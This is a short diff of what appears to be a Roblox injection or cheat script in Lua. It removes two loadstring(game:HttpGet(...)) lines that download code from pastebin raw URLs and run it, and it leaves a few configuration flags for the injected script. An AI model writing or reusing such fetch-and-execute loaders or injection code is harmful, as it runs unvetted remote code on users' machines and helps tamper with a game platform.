@@ -1,10 +1,6 @@
 -- CONFIG THIS BEFORE INJECTING!
 -- CONFIG THIS BEFORE INJECTING!
 -- CONFIG THIS BEFORE INJECTING!
-
-loadstring(game:HttpGet(('https://pastebin.com/raw/AGHXYtBq'),true))()
-wait(0.50)
-loadstring(game:HttpGet(('https://pastebin.com/raw/8srsxrLS'),true))()
 wait(0.0000000000000000000000000000001)
 local AllowMessages = true -- This cant be toggled when injected!
 local ShortcutProtectedMSG = false -- EPIC custom GUI! (SERVER SIDED)
